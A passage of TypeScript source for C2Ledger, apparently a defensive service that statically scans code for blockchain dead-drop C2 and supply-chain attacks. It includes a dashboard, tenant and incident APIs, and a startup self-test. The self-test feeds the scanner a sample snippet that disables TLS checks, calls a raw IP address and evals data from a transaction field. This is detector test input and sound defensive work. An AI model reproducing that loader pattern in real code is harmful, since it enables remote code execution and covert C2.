  !cats.has("network")?"no raw-IP C2-style destination detected":null
 ].filter(Boolean);
 const attackStrength=Math.min(100,(result?.score||0)+(attackSignals.length*5));
 const benignStrength=Math.min(100,(benignSignals.length*14));
 const margin=attackStrength-benignStrength;
 const verdict=margin>=45?"MALICIOUS_HYPOTHESIS_DOMINANT":margin<=0?"BENIGN_HYPOTHESIS_DOMINANT":"AMBIGUOUS";
 return {verdict,attackStrength,benignStrength,margin,attackHypothesis:{signals:attackSignals},benignHypothesis:{signals:benignSignals},policy:"fail-closed: AMBIGUOUS is never promoted to confirmed malicious"};
}

function negativeKnowledge(result:any){
 const direct=Array.isArray(result?.findings)?result.findings:[];
 const nested=Array.isArray(result?.files)?result.files.flatMap((f:any)=>Array.isArray(f?.findings)?f.findings:[]):[];
 const findings=[...direct,...nested];
 const lessons:any[]=[];
 if(findings.length===1&&findings[0]?.id==="CHAIN_RPC") lessons.push({pattern:"isolated-chain-rpc",effect:"downweight",reason:"RPC access alone is insufficient evidence of C2"});
 if(!findings.some((f:any)=>f.category==="execution")) lessons.push({pattern:"no-execution-sink",effect:"counterevidence",reason:"no code-execution sink was detected"});
 if(!findings.some((f:any)=>f.category==="credential")) lessons.push({pattern:"no-credential-access",effect:"counterevidence",reason:"no credential-access signal was detected"});
 if((result?.score||0)<30) lessons.push({pattern:"below-elevated-threshold",effect:"do-not-escalate",reason:"risk score remains below the elevated threshold"});
 return {status:"PASS",lessons,count:lessons.length};
}

async function replayCapsule(kind:string,inputRef:string,result:any){
 const rulepackHash=await currentRulepackHash();
 const inputHash=await sha256Hex(inputRef);
 const sanitized=cleanForLedger(result);
 const resultHash=await sha256Hex(JSON.stringify(sanitized));
 const capsule={schema:"c2ledger-replay/v1",kind,releaseId:RELEASE_ID,rulepackHash,inputHash,resultHash,verdict:result?.verdict||null,score:result?.score??null,createdAt:new Date().toISOString()};
 const capsuleHash=await sha256Hex(JSON.stringify(capsule));
 return {...capsule,capsuleHash};
}

async function enrichDecision(kind:string,inputRef:string,result:any){
 const arbiter=dualityArbiter(result);
 const negative=negativeKnowledge(result);
 const replay=await replayCapsule(kind,inputRef,result);
 return {arbiter,negativeKnowledge:negative,replay};
}

async function proofSnapshot(){
 const evidence=await probeEvidenceStore();
 const moatLayer=await probeMoatLayer();
 const integrationLayer=await probeIntegrationLayer();
 const productizationLayer=await probeProductizationLayer();
 const commercialLayer=await probeCommercialLayer();
 const benchmark=runBenchmark(3);
 const rulepackHash=await currentRulepackHash();
 const requiredEvidence=String(Bun.env.C2LEDGER_EVIDENCE_REQUIRED||"false")==="true";
 const expectedRulepack=String(Bun.env.C2LEDGER_EXPECTED_RULEPACK_HASH||"");
 const expectedVersion=String(Bun.env.C2LEDGER_EXPECTED_VERSION||"");
 const driftSentinel=expectedRulepack?{status:expectedRulepack===rulepackHash?"PASS":"FAIL",expected:expectedRulepack,actual:rulepackHash}:{status:"PARTIAL",reason:"expected-rulepack-not-pinned",actual:rulepackHash};
 const releaseControl=expectedVersion?{status:(RELEASE_ID.startsWith("v"+expectedVersion)&&"0.9.1"===expectedVersion)?"PASS":"FAIL",expectedVersion,releaseId:RELEASE_ID,runtimeVersion:"0.9.1"}:{status:"PARTIAL",reason:"expected-version-not-pinned",releaseId:RELEASE_ID,runtimeVersion:"0.9.1"};
 const hardFail=benchmark.status==="FAIL"||moatLayer.status==="FAIL"||integrationLayer.status==="FAIL"||productizationLayer.status==="FAIL"||commercialLayer.status==="FAIL"||driftSentinel.status==="FAIL"||releaseControl.status==="FAIL";
 const partial=(!requiredEvidence?false:evidence.status!=="PASS")||driftSentinel.status==="PARTIAL"||releaseControl.status==="PARTIAL";
 const gate=hardFail?"FAIL":partial?"PARTIAL":"PASS";
 const resilience=gate==="PASS"?"ACTIVE":gate==="FAIL"?"QUARANTINED":"SHIELDED";
 return {product:"C2Ledger",version:"0.9.1",releaseId:RELEASE_ID,gate,resilience,rulepackHash,selfTest:"PASS",benchmark,evidenceStore:evidence,moatLayer,integrationLayer,productizationLayer,commercialLayer,driftSentinel,releaseControl,connectorGuard:{status:"PASS",allowedHosts:[...Array.from(GITHUB_ALLOWED),...Array.from(CHAIN_ALLOWED)]},runtime:{deploymentId:Bun.env.RAILWAY_DEPLOYMENT_ID||null,serviceId:Bun.env.RAILWAY_SERVICE_ID||null,environmentId:Bun.env.RAILWAY_ENVIRONMENT_ID||null,publicDomain:Bun.env.RAILWAY_PUBLIC_DOMAIN||null},bricks:ASTRA_BRICKS,time:new Date().toISOString()};
}

const CSS = `
:root{font-family:Inter,system-ui,sans-serif;color:#eef2ff;background:#060913}*{box-sizing:border-box}body{margin:0;background:radial-gradient(circle at 20% 0,#17204b 0,transparent 34%),#060913;color:#eef2ff}.wrap{max-width:1160px;margin:auto;padding:28px}.nav{display:flex;justify-content:space-between;align-items:center;margin-bottom:48px}.brand{font-size:22px;font-weight:900;letter-spacing:-.04em}.status{font-size:12px;color:#94a3d9}.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#55d98d;margin-right:7px}.hero{display:grid;grid-template-columns:1.15fr .85fr;gap:28px;align-items:center}.eyebrow{font-size:12px;text-transform:uppercase;letter-spacing:.16em;color:#8ea2ff;font-weight:800}h1{font-size:clamp(44px,7vw,80px);line-height:.94;letter-spacing:-.055em;margin:12px 0 18px}.lead{font-size:19px;line-height:1.6;color:#b6bfdf}.card{background:#0d1224;border:1px solid #252d4b;border-radius:22px;padding:22px;box-shadow:0 25px 80px #0008}.metric{font-size:56px;font-weight:900}.muted{color:#8d97ba}.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin:28px 0}.mini{padding:17px;border-radius:16px;border:1px solid #222b48;background:#0a0f20}.mini b{display:block;font-size:20px;margin-bottom:5px}.scanner{margin-top:48px}.scanner h2{font-size:32px}textarea{width:100%;min-height:270px;background:#050814;color:#dbe4ff;border:1px solid #283152;border-radius:16px;padding:16px;font:13px/1.6 ui-monospace,monospace}.row{display:flex;gap:12px;flex-wrap:wrap;margin:14px 0}.btn{border:0;border-radius:12px;padding:12px 16px;font-weight:800;cursor:pointer;background:#8fa2ff;color:#07102a}.btn.secondary{background:#171e36;color:#cbd4ff;border:1px solid #30395d}.out{white-space:pre-wrap;background:#070b17;border:1px solid #252d4b;border-radius:16px;padding:18px;min-height:120px;font:13px/1.55 ui-monospace,monospace;color:#c9d4ff;overflow:auto}footer{margin:50px 0 14px;color:#6f789c;font-size:13px}@media(max-width:800px){.hero{grid-template-columns:1fr}.grid{grid-template-columns:1fr}.wrap{padding:20px}}
`;

const HTML = `<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>C2Ledger — Blockchain C2 Detection</title><meta name="description" content="Detect blockchain dead-drop C2 and developer supply-chain attack chains without executing suspicious payloads."><style>`+CSS+`</style></head><body><main class="wrap"><nav class="nav"><div class="brand">C2Ledger</div><div class="status"><span class="dot"></span>defensive engine online</div></nav><section class="hero"><div><div class="eyebrow">On-chain threat intelligence × DevSecOps</div><h1>Blockchains became C2 infrastructure. We watch the chain back.</h1><p class="lead">C2Ledger correlates blockchain RPC access, transaction decoding, dynamic execution, raw-IP networking and supply-chain signals. Web3 code alone is not treated as malware.</p><div class="grid"><div class="mini"><b>Cross-signal</b><span class="muted">Code + network + on-chain</span></div><div class="mini"><b>CI-ready</b><span class="muted">Machine-readable API verdicts</span></div><div class="mini"><b>No execution</b><span class="muted">Static defensive analysis</span></div></div></div><aside class="card"><div class="eyebrow">Risk engine</div><div class="metric">0→100</div><p class="muted">Signals become stronger only when they correlate into an attack chain.</p></aside></section><section class="scanner"><h2>Scan suspicious code</h2><p class="muted">Paste code, or scan a public GitHub repository. C2Ledger analyzes source text only and never executes repository code.</p><div class="row"><input id="repo" style="flex:1;min-width:260px;background:#050814;color:#dbe4ff;border:1px solid #283152;border-radius:12px;padding:12px" placeholder="https://github.com/owner/repo"><button class="btn" id="scanrepo">Scan GitHub repo</button></div><textarea id="src" placeholder="Paste suspicious code here..."></textarea><div class="row"><button class="btn" id="scan">Analyze risk</button><button class="btn secondary" id="sample">Load demo</button><button class="btn secondary" id="clear">Clear</button></div><div id="out" class="out">Ready. API: POST /api/scan</div></section><footer>C2Ledger v0.9.1 • /health • /api/rules</footer></main><script>const q=s=>document.querySelector(s);q("#sample").onclick=()=>q("#src").value="const provider = new ethers.JsonRpcProvider('https://example.invalid');\\nconst tx = await provider.getTransaction('0xdeadbeef');\\nconst data = tx.to.slice(2);";q("#clear").onclick=()=>{q("#src").value="";q("#repo").value="";q("#out").textContent="Ready."};q("#scanrepo").onclick=async()=>{const repoUrl=q("#repo").value;if(!repoUrl.trim()){q("#out").textContent="Enter a public GitHub repository URL.";return}q("#out").textContent="Scanning selected repository surfaces…";try{const r=await fetch("/api/scan/github",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({repoUrl})});q("#out").textContent=JSON.stringify(await r.json(),null,2)}catch(e){q("#out").textContent=String(e)}};q("#scan").onclick=async()=>{const content=q("#src").value;if(!content.trim()){q("#out").textContent="Paste code first.";return}q("#out").textContent="Analyzing…";try{const r=await fetch("/api/scan",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({content,path:"dashboard-input"})});q("#out").textContent=JSON.stringify(await r.json(),null,2)}catch(e){q("#out").textContent=String(e)}};</script></body></html>`;

function hs(type:string){return {"content-type":type,"x-content-type-options":"nosniff","x-frame-options":"DENY","referrer-policy":"no-referrer","content-security-policy":"default-src 'self'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; connect-src 'self'; frame-ancestors 'none'"};}

const safeTest=scan("const p = new ethers.JsonRpcProvider('https://example.invalid');","selftest-safe");
const badTest=scan("const p = new ethers.JsonRpcProvider('https://rpc.example.invalid'); const tx={to:'0xabc'}; const x=tx.to.slice(2); process.env.NODE_TLS_REJECT_UNAUTHORIZED='0'; fetch('http://181.214.149.148:443'); eval(x);","selftest-suspicious");
if(safeTest.score>20 || badTest.score<80){console.error("SELFTEST FAIL",JSON.stringify({safe:safeTest.score,bad:badTest.score}));process.exit(1);}
console.log("SELFTEST PASS",JSON.stringify({safe:safeTest.score,bad:badTest.score,safeVerdict:safeTest.verdict,badVerdict:badTest.verdict}));


const RATE_BUCKET=new Map<string,{count:number,reset:number}>();
function rateAllowed(req:Request){
 const now=Date.now(); const ip=(req.headers.get("x-forwarded-for")||req.headers.get("x-real-ip")||"unknown").split(",")[0].trim();
 const key=ip; const cur=RATE_BUCKET.get(key);
 if(!cur||now>=cur.reset){RATE_BUCKET.set(key,{count:1,reset:now+60000});return {ok:true,remaining:59};}
 cur.count++; RATE_BUCKET.set(key,cur); return {ok:cur.count<=60,remaining:Math.max(0,60-cur.count),retryAfter:Math.max(1,Math.ceil((cur.reset-now)/1000))};
}

Bun.serve({port:Number(Bun.env.PORT||3000),async fetch(req){
 const u=new URL(req.url);
 if(req.method==="GET"&&u.pathname==="/") return new Response(HTML,{headers:hs("text/html; charset=utf-8")});
 if((req.method==="GET"||req.method==="POST")&&u.pathname==="/health") return new Response(JSON.stringify({ok:true,product:"C2Ledger",version:"0.9.1",releaseId:RELEASE_ID,selfTest:"PASS",time:new Date().toISOString()}),{headers:hs("application/json")});
 if((req.method==="GET"||req.method==="POST")&&u.pathname==="/health/commercial"){
  const proof=await proofSnapshot();
  const ok=proof.gate==="PASS"&&proof.productizationLayer?.status==="PASS"&&proof.commercialLayer?.status==="PASS"&&COMMERCIAL_PLANS.length===4;
  const payload={ok,product:"C2Ledger",version:PRODUCT_VERSION,gate:proof.gate,productization:proof.productizationLayer,commercial:proof.commercialLayer,plans:COMMERCIAL_PLANS.map(x=>({id:x.id,name:x.name,priceMonthlyEur:x.priceMonthlyEur,monthlyQuota:x.monthlyQuota})),evidenceStore:proof.evidenceStore?.status,releaseControl:proof.releaseControl?.status,time:new Date().toISOString()};
  console.log("COMMERCIAL_HEALTH",JSON.stringify(payload));
  return new Response(JSON.stringify(payload),{status:ok?200:503,headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/health/deep"){
  const proof=await proofSnapshot();
  return new Response(JSON.stringify({ok:proof.gate==="PASS",...proof}),{status:proof.gate==="PASS"?200:503,headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/api/proof"){
  const proof=await proofSnapshot();
  return new Response(JSON.stringify(proof),{headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/api/gate"){
  const proof=await proofSnapshot();
  return new Response(JSON.stringify(proof),{status:proof.gate==="PASS"?200:503,headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/api/harness"){
  const proof=await proofSnapshot();
  const allowPromotion=proof.gate==="PASS";
  return new Response(JSON.stringify({harness:"ASTRA_HARNESS",allowPromotion,ciExitCode:allowPromotion?0:1,proof}),{status:allowPromotion?200:503,headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/api/bricks") return new Response(JSON.stringify({product:"C2Ledger",releaseId:RELEASE_ID,bricks:ASTRA_BRICKS}),{headers:hs("application/json")});
 if(req.method==="GET"&&u.pathname==="/api/benchmark"){
  const iterations=Math.max(1,Math.min(50,Number(u.searchParams.get("iterations")||10)||10));
  return new Response(JSON.stringify(runBenchmark(iterations)),{headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/pricing") return new Response(pricingHtml(),{headers:hs("text/html; charset=utf-8")});
 if(req.method==="GET"&&u.pathname==="/api/plans") return new Response(JSON.stringify({currency:"EUR",plans:COMMERCIAL_PLANS}),{headers:hs("application/json")});
 if(req.method==="POST"&&u.pathname==="/api/pilot/apply"){
  const rl=rateAllowed(req); if(!rl.ok) return new Response(JSON.stringify({error:"rate limit exceeded",retryAfter:rl.retryAfter}),{status:429,headers:hs("application/json")});
  let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  try{return new Response(JSON.stringify(await submitPilot(body)),{headers:hs("application/json")});}catch(e:any){return new Response(JSON.stringify({error:String(e?.message||e)}),{status:400,headers:hs("application/json")});}
 }
 if(req.method==="GET"&&u.pathname==="/api/admin/pilots"){
  if(!adminAuthorized(req)) return new Response(JSON.stringify({error:"admin authorization required"}),{status:401,headers:hs("application/json")});
  const state:any=await pilotApplications(); return new Response(JSON.stringify({count:(state.items||[]).length,items:(state.items||[]).slice(0,500)}),{headers:hs("application/json")});
 }
 if(req.method==="POST"&&u.pathname==="/api/admin/pilots/approve"){
  if(!adminAuthorized(req)) return new Response(JSON.stringify({error:"admin authorization required"}),{status:401,headers:hs("application/json")});
  let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  try{return new Response(JSON.stringify(await approvePilot(String(body?.applicationId||""))),{headers:hs("application/json")});}catch(e:any){return new Response(JSON.stringify({error:String(e?.message||e)}),{status:400,headers:hs("application/json")});}
 }
 if(req.method==="POST"&&u.pathname==="/api/tenant/key/rotate"){
  const tenant=await tenantAuthorized(req); if(!tenant) return new Response(JSON.stringify({error:"tenant authorization required"}),{status:401,headers:hs("application/json")});
  try{return new Response(JSON.stringify(await rotateTenantKey(tenant)),{headers:hs("application/json")});}catch(e:any){return new Response(JSON.stringify({error:String(e?.message||e)}),{status:400,headers:hs("application/json")});}
 }
 if(req.method==="GET"&&u.pathname==="/api/tenant/audit"){
  const tenant=await tenantAuthorized(req); if(!tenant) return new Response(JSON.stringify({error:"tenant authorization required"}),{status:401,headers:hs("application/json")});
  const state:any=await readState("state/audit-"+tenant.id+".json",{schema:"c2ledger-tenant-audit/v1",tenantId:tenant.id,items:[]});
  return new Response(JSON.stringify({tenant:{id:tenant.id,name:tenant.name,plan:tenant.plan},count:(state.items||[]).length,items:(state.items||[]).slice(0,500)}),{headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/soc") return new Response(socHtml(),{headers:hs("text/html; charset=utf-8")});
 if(req.method==="GET"&&u.pathname==="/api/soc/summary") return new Response(JSON.stringify(await socSnapshot()),{headers:hs("application/json")});
 if(req.method==="GET"&&u.pathname==="/api/soc/private"){
  const tenant=adminAuthorized(req)?{id:"admin",name:"Administrator",plan:"admin"}:await tenantAuthorized(req);
  if(!tenant) return new Response(JSON.stringify({error:"authorization required"}),{status:401,headers:hs("application/json")});
  return new Response(JSON.stringify(await socPrivateSnapshot(tenant)),{headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/api/openapi.json") return new Response(JSON.stringify(openApiDoc()),{headers:hs("application/json")});
 if(req.method==="GET"&&u.pathname==="/api/intel/stix"){
  const feed:any=await readState("state/intel-feed.json",{items:[]}); return new Response(JSON.stringify(await toStixBundle(feed)),{headers:hs("application/stix+json")});
 }
 if(req.method==="GET"&&u.pathname==="/api/tenant/usage"){
  const tenant=await tenantAuthorized(req); if(!tenant) return new Response(JSON.stringify({error:"tenant authorization required"}),{status:401,headers:hs("application/json")});
  const {row}=await tenantUsage(tenant.id); const quota=Math.max(1,Number(tenant.monthlyQuota||5000)||5000);
  return new Response(JSON.stringify({tenant:{id:tenant.id,name:tenant.name,plan:tenant.plan||"pilot"},month:monthKey(),usage:row,quota,remaining:Math.max(0,quota-(row.units||0))}),{headers:hs("application/json")});
 }
 if(req.method==="POST"&&u.pathname==="/api/tenant/scan"){
  const tenant=await tenantAuthorized(req); if(!tenant) return new Response(JSON.stringify({error:"tenant authorization required"}),{status:401,headers:hs("application/json")});
  let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  const content=String(body?.content||""); if(!content.trim()) return new Response(JSON.stringify({error:"content is required"}),{status:400,headers:hs("application/json")});
  const units=Math.max(1,Math.ceil(new TextEncoder().encode(content).length/10000)); const quota=await consumeTenantQuota(tenant,units);
  if(!quota.allowed) return new Response(JSON.stringify({error:"monthly quota exhausted",quota}),{status:402,headers:hs("application/json")});
  const result=scan(content,String(body?.path||"tenant-input")); const evidence=await persistEvidence("tenant-scan",content,{tenantId:tenant.id,result}); await appendTenantAudit(tenant.id,"SCAN",{path:result.path,score:result.score,verdict:result.verdict,units,evidenceDigest:evidence.digest});
  return new Response(JSON.stringify({status:evidence.status==="PASS"?"PASS":"PARTIAL",tenant:{id:tenant.id,plan:tenant.plan||"pilot"},quota,result,evidence}),{headers:hs("application/json")});
 }
 if(req.method==="POST"&&u.pathname.startsWith("/api/incidents/")){
  const tenant=adminAuthorized(req)?{id:"admin"}:await tenantAuthorized(req); if(!tenant) return new Response(JSON.stringify({error:"authorization required"}),{status:401,headers:hs("application/json")});
  const id=decodeURIComponent(u.pathname.slice("/api/incidents/".length)); let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  const next=String(body?.status||"").toUpperCase(); if(!["OPEN","ACKNOWLEDGED","RESOLVED","FALSE_POSITIVE"].includes(next)) return new Response(JSON.stringify({error:"invalid incident status"}),{status:400,headers:hs("application/json")});
  const state:any=await readState("state/incidents.json",{items:[]}); const item=(state.items||[]).find((x:any)=>x.id===id);
  if(!item) return new Response(JSON.stringify({error:"incident not found"}),{status:404,headers:hs("application/json")});
  if(tenant.id!=="admin"&&item.source!==tenant.id) return new Response(JSON.stringify({error:"forbidden"}),{status:403,headers:hs("application/json")});
  item.status=next; item.updatedAt=new Date().toISOString(); item.updatedBy=tenant.id; if(body?.note) item.analystNote=String(body.note).slice(0,1000);
  state.updatedAt=item.updatedAt; await writeState("state/incidents.json",state); await persistEvidence("incident-lifecycle",id+"|"+next,item); if(tenant.id!=="admin") await appendTenantAudit(tenant.id,"INCIDENT_STATUS",{incidentId:id,status:next});
  return new Response(JSON.stringify({status:"PASS",incident:item}),{headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/api/intel/stats") return new Response(JSON.stringify(await intelStats()),{headers:hs("application/json")});
 if(req.method==="GET"&&u.pathname==="/api/intel/feed"){
  const feed:any=await readState("state/intel-feed.json",{schema:"c2ledger-intel/v1",items:[]});
  const limit=Math.max(1,Math.min(250,Number(u.searchParams.get("limit")||100)||100));
  const chain=String(u.searchParams.get("chain")||"").toLowerCase();
  const items=(feed.items||[]).filter((x:any)=>!chain||x.chain===chain).slice(0,limit).map((x:any)=>({id:x.id,chain:x.chain,type:x.type,value:x.value,confidence:x.confidence,firstSeen:x.firstSeen,lastSeen:x.lastSeen,seenCount:x.seenCount,tags:x.tags}));
  return new Response(JSON.stringify({schema:feed.schema||"c2ledger-intel/v1",count:items.length,items,updatedAt:feed.updatedAt||null}),{headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/api/incidents"){
  const tenant=adminAuthorized(req)?{id:"admin"}:await tenantAuthorized(req);
  if(!tenant) return new Response(JSON.stringify({error:"authorization required"}),{status:401,headers:hs("application/json")});
  const state:any=await readState("state/incidents.json",{items:[]});
  return new Response(JSON.stringify({tenant:tenant.id,count:(state.items||[]).length,items:(state.items||[]).slice(0,250)}),{headers:hs("application/json")});
 }
 if(req.method==="POST"&&u.pathname==="/api/admin/tenants"){
  if(!adminAuthorized(req)) return new Response(JSON.stringify({error:"admin authorization required"}),{status:401,headers:hs("application/json")});
  let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  const name=String(body?.name||"").trim().slice(0,80); if(!name) return new Response(JSON.stringify({error:"name is required"}),{status:400,headers:hs("application/json")});
  const token="c2l_"+crypto.randomUUID().replaceAll("-","")+crypto.randomUUID().replaceAll("-","");
  const keyHash=await sha256Hex(token); const id="tenant_"+(await sha256Hex(name+"|"+Date.now())).slice(0,16);
  const state:any=await readState("state/tenants.json",{schema:"c2ledger-tenants/v1",tenants:[]});
  const plan=String(body?.plan||"pilot").slice(0,24); const monthlyQuota=Math.max(100,Math.min(1000000,Number(body?.monthlyQuota||5000)||5000));
  state.tenants=[...(state.tenants||[]),{id,name,keyHash,active:true,plan,monthlyQuota,createdAt:new Date().toISOString()}].slice(-500); await writeState("state/tenants.json",state);
  return new Response(JSON.stringify({status:"PASS",tenant:{id,name,plan,monthlyQuota},apiKey:token,warning:"Store this API key now; only its hash is retained."}),{headers:hs("application/json")});
 }
 if(req.method==="POST"&&u.pathname==="/api/intel/ingest"){
  const tenant=adminAuthorized(req)?{id:"admin"}:await tenantAuthorized(req);
  if(!tenant) return new Response(JSON.stringify({error:"authorization required"}),{status:401,headers:hs("application/json")});
  let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  try{return new Response(JSON.stringify(await ingestIntel(body,tenant.id)),{headers:hs("application/json")});}
  catch(e:any){return new Response(JSON.stringify({error:String(e?.message||e),status:"FAIL"}),{status:400,headers:hs("application/json")});}
 }
 if(req.method==="POST"&&u.pathname==="/api/multichain/inspect"){
  const rl=rateAllowed(req); if(!rl.ok) return new Response(JSON.stringify({error:"rate limit exceeded",retryAfter:rl.retryAfter}),{status:429,headers:hs("application/json")});
  let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  const chain=String(body?.chain||"").toLowerCase() as SupportedChain; if(!SUPPORTED_CHAINS.includes(chain)) return new Response(JSON.stringify({error:"unsupported chain",supportedChains:SUPPORTED_CHAINS}),{status:400,headers:hs("application/json")});
  try{const result=await inspectTransaction(chain,String(body?.txHash||"")); const evidence=await persistEvidence("multichain-transaction-metadata",chain+"|"+String(body?.txHash||""),result); return new Response(JSON.stringify({...result,evidence}),{headers:hs("application/json")});}
  catch(e:any){return new Response(JSON.stringify({error:String(e?.message||e),status:"PARTIAL",chain}),{status:502,headers:hs("application/json")});}
 }
 if(req.method==="GET"&&u.pathname==="/api/github/action.yml") return new Response(githubActionYaml(),{headers:hs("text/yaml; charset=utf-8")});
 if(req.method==="GET"&&u.pathname==="/api/reputation"){
  const chain=String(u.searchParams.get("chain")||"").toLowerCase(); const value=String(u.searchParams.get("value")||"");
  if(!value) return new Response(JSON.stringify({error:"value is required"}),{status:400,headers:hs("application/json")});
  return new Response(JSON.stringify(await reputationLookup(chain,value)),{headers:hs("application/json")});
 }
 if(req.method==="GET"&&u.pathname==="/api/alerts/status"){
  const tenant=adminAuthorized(req)?{id:"admin"}:await tenantAuthorized(req); if(!tenant) return new Response(JSON.stringify({error:"authorization required"}),{status:401,headers:hs("application/json")});
  const state:any=await readState("state/alerts.json",{items:[]}); const items=state.items||[];
  return new Response(JSON.stringify({pending:items.filter((x:any)=>x.status==="PENDING").length,delivered:items.filter((x:any)=>x.status==="DELIVERED").length,total:items.length,targetsConfigured:configuredAlertTargets().length}),{headers:hs("application/json")});
 }
 if(req.method==="POST"&&u.pathname==="/api/alerts/dispatch"){
  if(!adminAuthorized(req)) return new Response(JSON.stringify({error:"admin authorization required"}),{status:401,headers:hs("application/json")});
  return new Response(JSON.stringify(await dispatchAlerts()),{headers:hs("application/json")});
 }
 if(req.method==="POST"&&u.pathname==="/api/scan/sarif"){
  let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  const content=String(body?.content||""); if(!content.trim()) return new Response(JSON.stringify({error:"content is required"}),{status:400,headers:hs("application/json")});
  const result=scan(content,String(body?.path||"api-input")); return new Response(JSON.stringify(toSarif(result)),{headers:hs("application/sarif+json")});
 }
 if(req.method==="POST"&&u.pathname==="/api/ci/gate"){
  let body:any; try{body=await req.json();}catch{return new Response(JSON.stringify({error:"invalid body"}),{status:400,headers:hs("application/json")});}
  const content=String(body?.content||""); if(!content.trim()) return new Response(JSON.stringify({error:"content is required"}),{status:400,headers:hs("application/json")});
  if(new TextEncoder().encode(content).length>1000000) return new Response(JSON.stringify({error:"1 MB limit"}),{status:413,headers:hs("application/json")});
  const result=scan(content,String(body?.path||"ci-input")); const decision=ciDecision(result,Number(u.searchParams.get("threshold")||55)); const sarif=toSarif(result);
  const evidence=await persistEvidence("ci-gate",content,{result,decision});
  if(decision.blocked) await queueAlert({kind:"ci-gate",decision,path:result.path,evidenceDigest:evidence.digest});
  return new Response(JSON.stringify({product:"C2Ledger",version:PRODUCT_VERSION,decision,result,sarif,evidence}),{status:decision.blocked?422:200,headers:hs("application/json")});
 }
 if(req.method==="POST"&&u.pathname==="/api/github/webhook"){
  const raw=await req.text(); const sig=String(req.headers.get("x-hub-signature-256")||"");
  if(!(await verifyGithubSignature(raw,sig))) return new Response(JSON.stringify({error:"invalid GitHub webhook signature"}),{status:401,headers:hs("application/json")});
  let body:any; try{body=JSON.parse(raw);}catch{return new Response(JSON.stringify({error:"invalid JSON"}),{status:400,headers:hs("application/json")});}
  const event=String(req.headers.get("x-github-event")||"unknown"); const repoUrl=String(body?.repository?.html_url||"");
  if(!["push","pull_request"].includes(event)) return new Response(JSON.stringify({status:"PASS",ignored:true,event}),{headers:hs("application/json")});
  if(!repoUrl) return new Response(JSON.stringify({status:"PARTIAL",reason:"repository URL missing",event}),{status:202,headers:hs("application/json")});
  try{
   const result=await scanGithub(repoUrl); const decision=ciDecision(result,55); const evidence=await persistEvidence("github-webhook",repoUrl,{event,result,decision});
   if(decision.blocked) await queueAlert({kind:"github-webhook",event,repository:result.repository,decision,evidenceDigest:evidence.digest});
   return new Response(JSON.stringify({status:evidence.status,event,repository:result.repository,decision,result,evidence}),{status:decision.blocked?202:200,headers:hs("application/json")});
  }catch(e:any){
   return new Response(JSON.stringify({status:"PARTIAL",event,error:String(e?.message||e),note:"Private repositories require GitHub App installation credentials."}),{status:202,headers:hs("application/json")});
  }
 }
 if(req.method==="GET"&&u.pathname==="/api/rules") return new Response(JSON.stringify({releaseId:RELEASE_ID,productVersion:PRODUCT_VERSION,rules:RULES.map(r=>({id:r.id,title:r.title,severity:r.severity,category:r.category,weight:r.weight,reason:r.reason}))}),{headers:hs("application/json")});
 if(req.method==="GET"&&u.pathname==="/api/enterprise"){
  const proof=await proofSnapshot();
  return new Response(JSON.stringify({product:"C2Ledger",edition:"ASTRA OMEGA",version:PRODUCT_VERSION,releaseId:RELEASE_ID,capabilities:{evidenceLedger:true,contentAddressedProofs:true,dualityArbiter:true,negativeKnowledge:true,replayCapsules:true,benchmarkGate:true,releaseControl:true,connectorGuard:true,rateLimit:true,githubRepositoryScan:true,noUntrustedExecution:true,threatIntelFeed:true,incidentHistory:true,tenantApiKeys:true,multiChainInspection:true,proprietaryMoatData:true,sarifExport:true,ciPrGate:true,githubWebhookReceiver:true,durableAlertQueue:true,longitudinalReputation:true,socDashboard:true,stix21Export:true,tenantQuotaMeter:true,incidentLifecycle:true,openApiContract:true,alertDispatcher:true,commercialOnboarding:true,tenantKeyRotation:true,tenantAuditTrail:true,pricingPackaging:true,enterpriseReadiness:true},assurance:{gate:proof.gate,resilience:proof.resilience,benchmark:proof.benchmark.status,evidenceStore:proof.evidenceStore.status,moatLayer:proof.moatLayer?.status,integrationLayer:proof.integrationLayer?.status,productizationLayer:proof.productizationLayer?.status,commercialLayer:proof.commercialLayer?.status,driftSentinel:proof.driftSentinel.status,releaseControl:proof.releaseControl.status},endpoints:["/api/scan","/api/scan/github","/api/multichain/inspect","/api/intel/feed","/api/intel/stats","/api/intel/ingest","/api/incidents","/api/admin/tenants","/api/scan/sarif","/api/ci/gate","/api/github/webhook","/api/github/action.yml","/api/reputation","/api/alerts/status","/api/alerts/dispatch","/soc","/api/soc/summary","/api/openapi.json","/api/intel/stix","/api/tenant/usage","/api/tenant/scan","/pricing","/api/plans","/api/pilot/apply","/api/admin/pilots","/api/admin/pilots/approve","/api/tenant/key/rotate","/api/tenant/audit","/api/proof","/api/gate","/api/harness","/api/benchmark","/api/bricks","/api/rules"],commercialPositioning:"De